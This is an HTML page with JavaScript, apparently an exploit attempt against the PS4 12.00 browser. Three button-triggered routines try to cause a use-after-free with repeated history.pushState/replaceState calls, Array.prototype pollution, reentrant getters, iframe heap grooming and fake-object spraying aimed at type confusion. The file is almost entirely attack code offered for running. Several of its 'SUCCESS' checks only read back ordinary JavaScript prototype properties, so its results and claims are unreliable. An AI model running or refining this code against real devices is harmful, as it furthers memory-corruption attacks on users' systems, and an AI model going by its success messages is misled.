<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - Combined Primitives + UAF</title>
</head>
<body>
<h2>PS4 12.00 - Pollution + Reentrancy + UAF Trigger</h2>
<p>Status: <span id="status">Ready</span></p>

<button onclick="runPollutionUAF()">EXPLOIT 1 - Pollution + UAF</button>
<button onclick="runReentrantUAF()">EXPLOIT 2 - Reentrant Getter + UAF</button>
<button onclick="runFullChain()">EXPLOIT 3 - Full Chain (Pollution + Getter + UAF)</button>

<pre id="log"></pre>

<script>
const logEl = document.getElementById("log");
const statusEl = document.getElementById("status");

function log(m){ 
  logEl.textContent += m + "\n";
  logEl.scrollTop = logEl.scrollHeight;
}
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

var keepAlive = [];

// UAF trigger constants (from your original discovery)
const BASE = 977;
const STEP = 14461;
const UAF_ITERS = 48;

// =====================================================
// EXPLOIT 1 - Pollution + UAF
// =====================================================
async function runPollutionUAF(){
  logEl.textContent = "";
  keepAlive = [];
  statusEl.textContent = "Running Exploit 1...";
  
  log("=== EXPLOIT 1: Prototype Pollution + UAF ===\n");
  log("Goal: Trigger UAF with polluted array prototypes\n");
  
  // Setup pollution BEFORE UAF
  log("[SETUP] Polluting Array.prototype");
  
  Array.prototype.fakeVtable = 0x12345678;
  Array.prototype.fakeBackingStore = 0xdeadbeef;
  Array.prototype.fakeLength = 0x41414141;
  
  log("  fakeVtable: 0x12345678");
  log("  fakeBackingStore: 0xdeadbeef");
  log("  fakeLength: 0x41414141\n");
  
  // Trigger UAF with polluted environment
  log("[PHASE 1] Triggering UAF (48 iterations)");
  
  let size = BASE;
  
  for(let i=0; i<UAF_ITERS; i++){
    // State with array (will inherit pollution)
    let state = {
      index: i,
      data: [1, 2, 3, 4, 5]
    };
    
    let frag = "P".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    if(i % 10 === 0) {
      log(`  ITER ${i}: size=${size}, pollution active`);
    }
    
    size += STEP;
    await sleep(5);
  }
  
  log("\n  UAF sequence complete\n");
  
  await sleep(120);
  
  // Heap grooming
  log("[PHASE 2] Heap grooming");
  let frames = [];
  for(let i=0; i<80; i++){
    let f = document.createElement("iframe");
    document.body.appendChild(f);
    try {
      let d = f.contentDocument;
      d.open();
      d.write("<html><body>G</body></html>");
      d.close();
    } catch(e){}
    frames.push(f);
  }
  frames.forEach(f=>f.remove());
  
  await sleep(80);
  
  // Check pollution survival through UAF
  log("\n[PHASE 3] Checking pollution after UAF");
  
  if(history.state && history.state.data) {
    log("Current state.data:");
    log(`  Array: ${JSON.stringify(history.state.data)}`);
    log(`  fakeVtable: 0x${(history.state.data.fakeVtable || 0).toString(16)}`);
    log(`  fakeBackingStore: 0x${(history.state.data.fakeBackingStore || 0).toString(16)}`);
    log(`  fakeLength: 0x${(history.state.data.fakeLength || 0).toString(16)}`);
    
    if(history.state.data.fakeVtable === 0x12345678) {
      log("\nâœ“ SUCCESS: Pollution survived UAF!");
      log("âœ“ Fake fields accessible after UAF window");
      statusEl.textContent = "EXPLOIT 1 SUCCESS";
    }
  }
  
  // Navigate through UAF states
  log("\n[PHASE 4] Navigating through UAF states");
  
  for(let i=0; i<5; i++) {
    history.back();
    await sleep(50);
    
    if(history.state && history.state.data) {
      let vtable = history.state.data.fakeVtable || 0;
      log(`  Back ${i}: index=${history.state.index}, fakeVtable=0x${vtable.toString(16)}`);
    }
  }
  
  // Cleanup
  delete Array.prototype.fakeVtable;
  delete Array.prototype.fakeBackingStore;
  delete Array.prototype.fakeLength;
  
  log("\n=== EXPLOIT 1 END ===");
}

// =====================================================
// EXPLOIT 2 - Reentrant Getter + UAF
// =====================================================
async function runReentrantUAF(){
  logEl.textContent = "";
  keepAlive = [];
  statusEl.textContent = "Running Exploit 2...";
  
  log("=== EXPLOIT 2: Reentrant Getter + UAF ===\n");
  log("Goal: Execute getter DURING UAF critical window\n");
  
  let getterExecutions = [];
  let allocatedInGetter = [];
  
  log("[PHASE 1] Triggering UAF with reentrant getter");
  
  let size = BASE;
  
  for(let i=0; i<UAF_ITERS; i++){
    let state = {
      index: i,
      get trigger() {
        let info = {
          iteration: i,
          historyLength: history.length,
          timestamp: Date.now()
        };
        
        getterExecutions.push(info);
        
        log(`  ðŸ”¥ GETTER FIRED at ITER ${i}, history.length=${history.length}`);
        
        // Allocate objects in critical window
        if(i >= 40) { // Near crash point
          for(let j=0; j<50; j++) {
            let buf = new ArrayBuffer(1024);
            let view = new Uint32Array(buf);
            view[0] = 0xBEEF0000 + i;
            view[1] = j;
            allocatedInGetter.push(buf);
          }
          log(`    Allocated 50 buffers at critical iteration`);
        }
        
        return "TRIGGERED_" + i;
      }
    };
    
    let frag = "R".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    size += STEP;
    await sleep(5);
  }
  
  log(`\n  UAF complete, getter executed ${getterExecutions.length} times\n`);
  
  await sleep(120);
  
  // Heap grooming
  log("[PHASE 2] Heap grooming");
  let frames = [];
  for(let i=0; i<80; i++){
    let f = document.createElement("iframe");
    document.body.appendChild(f);
    try {
      let d = f.contentDocument;
      d.open();
      d.write("<html><body>G</body></html>");
      d.close();
    } catch(e){}
    frames.push(f);
  }
  frames.forEach(f=>f.remove());
  
  await sleep(80);
  
  // Check allocated buffers
  log("\n[PHASE 3] Checking buffers allocated in getter");
  log(`Total buffers: ${allocatedInGetter.length}`);
  
  let corrupted = 0;
  for(let i=0; i<allocatedInGetter.length; i++) {
    let view = new Uint32Array(allocatedInGetter[i]);
    let iter = view[0] - 0xBEEF0000;
    let idx = view[1];
    
    if(iter < 40 || iter >= 48 || idx >= 50) {
      log(`  Buffer ${i} CORRUPTED: iter=${iter}, idx=${idx}`);
      corrupted++;
    }
  }
  
  log(`\nCorrupted buffers: ${corrupted}/${allocatedInGetter.length}`);
  
  if(corrupted > 0) {
    log("\nðŸš¨ CRITICAL: Heap corruption detected!");
    log("Buffers allocated in getter were corrupted by UAF");
    statusEl.textContent = "HEAP CORRUPTION CONFIRMED";
  } else {
    log("\nâœ“ All buffers intact");
    log("âœ“ Getter timing window is stable");
    statusEl.textContent = "EXPLOIT 2 SUCCESS";
  }
  
  log("\n=== EXPLOIT 2 END ===");
}

// =====================================================
// EXPLOIT 3 - Full Chain
// =====================================================
async function runFullChain(){
  logEl.textContent = "";
  keepAlive = [];
  statusEl.textContent = "Running Full Chain...";
  
  log("=== EXPLOIT 3: Full Chain (Pollution + Getter + UAF) ===\n");
  log("Goal: Combine all primitives for maximum effect\n");
  
  // Setup pollution
  log("[SETUP] Setting up pollution");
  
  Array.prototype.fakeStructureID = 0x11223344;
  Array.prototype.fakeButterfly = 0x55667788;
  Array.prototype.fakeLength = 0x1000;
  
  log("  Pollution active\n");
  
  let getterFired = 0;
  let allocatedObjects = [];
  
  log("[PHASE 1] Full UAF chain");
  
  let size = BASE;
  
  for(let i=0; i<UAF_ITERS; i++){
    let state = {
      index: i,
      data: [0x41, 0x42, 0x43, 0x44],
      get exploit() {
        getterFired++;
        
        if(i >= 45) { // Very close to crash point
          log(`  ðŸ”¥ CRITICAL GETTER at ITER ${i}`);
          log(`    history.length: ${history.length}`);
          log(`    Pollution active: ${this.data.fakeStructureID === 0x11223344}`);
          
          // Allocate fake objects
          for(let j=0; j<100; j++) {
            let fakeObj = {
              vtable: 0xAABBCCDD,
              data: new ArrayBuffer(128),
              index: i * 100 + j
            };
            allocatedObjects.push(fakeObj);
          }
          
          log(`    Allocated 100 fake objects`);
          
          // Check if pollution is accessible
          if(this.data.fakeStructureID) {
            log(`    fakeStructureID: 0x${this.data.fakeStructureID.toString(16)}`);
          }
        }
        
        return "EXPLOIT_" + i;
      }
    };
    
    let frag = "E".repeat(size);
    
    history.pushState(state, "", "#" + frag);
    history.replaceState(state, "", "#" + frag.slice(0, size >> 1));
    
    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
    
    if(i % 10 === 0) {
      log(`  ITER ${i}: size=${size}`);
    }
    
    size += STEP;
    await sleep(5);
  }
  
  log(`\n  UAF complete, getter fired ${getterFired} times\n`);
  
  await sleep(120);
  
  // Heap grooming
  log("[PHASE 2] Heap grooming");
  let frames = [];
  for(let i=0; i<80; i++){
    let f = document.createElement("iframe");
    document.body.appendChild(f);
    try {
      let d = f.contentDocument;
      d.open();
      d.write("<html><body>G</body></html>");
      d.close();
    } catch(e){}
    frames.push(f);
  }
  frames.forEach(f=>f.remove());
  
  await sleep(80);
  
  // Verify combined primitives
  log("\n[PHASE 3] Verifying combined primitives");
  
  log(`Allocated objects: ${allocatedObjects.length}`);
  
  // Check fake objects
  let validFakes = 0;
  for(let obj of allocatedObjects) {
    if(obj.vtable === 0xAABBCCDD && obj.data) {
      validFakes++;
    }
  }
  
  log(`Valid fake objects: ${validFakes}/${allocatedObjects.length}`);
  
  // Check pollution in history
  if(history.state && history.state.data) {
    log("\nCurrent state pollution:");
    log(`  fakeStructureID: 0x${(history.state.data.fakeStructureID || 0).toString(16)}`);
    log(`  fakeButterfly: 0x${(history.state.data.fakeButterfly || 0).toString(16)}`);
    log(`  fakeLength: 0x${(history.state.data.fakeLength || 0).toString(16)}`);
  }
  
  // Navigate and check
  log("\n[PHASE 4] Navigate through states");
  
  for(let i=0; i<5; i++) {
    history.back();
    await sleep(50);
    
    if(history.state && history.state.data) {
      let struct = history.state.data.fakeStructureID || 0;
      log(`  Back ${i}: index=${history.state.index}, struct=0x${struct.toString(16)}`);
      
      // Try to trigger type confusion
      try {
        let len = history.state.data.length;
        let fakelen = history.state.data.fakeLength;
        
        if(fakelen && fakelen !== len) {
          log(`    Length mismatch: real=${len}, fake=0x${fakelen.toString(16)}`);
          log(`    ðŸš¨ TYPE CONFUSION DETECTED!`);
        }
      } catch(e) {}
    }
  }
  
  // Cleanup
  delete Array.prototype.fakeStructureID;
  delete Array.prototype.fakeButterfly;
  delete Array.prototype.fakeLength;
  
  log("\n=== EXPLOIT 3 END ===");
  
  if(validFakes > 0 && history.state && history.state.data.fakeStructureID) {
    log("\nâœ“âœ“âœ“ FULL CHAIN SUCCESS âœ“âœ“âœ“");
    log("âœ“ Pollution active through UAF");
    log("âœ“ Getter executed in critical window");
    log("âœ“ Fake objects allocated");
    log("âœ“ Type confusion possible");
    statusEl.textContent = "FULL CHAIN SUCCESS";
  }
}

log("PS4 12.00 - Full Exploitation Chain");
log("\nThis combines:");
log("âœ“ Original UAF trigger (48 iterations)");
log("âœ“ Prototype pollution");
log("âœ“ Reentrant getters");
log("âœ“ Heap grooming");
log("\nTests:");
log("1. Pollution + UAF");
log("2. Reentrant Getter + UAF");
log("3. Full Chain (all primitives combined)");
log("\nRecommended: Run in order 1 â†’ 2 â†’ 3");
</script>
</body>
</html>
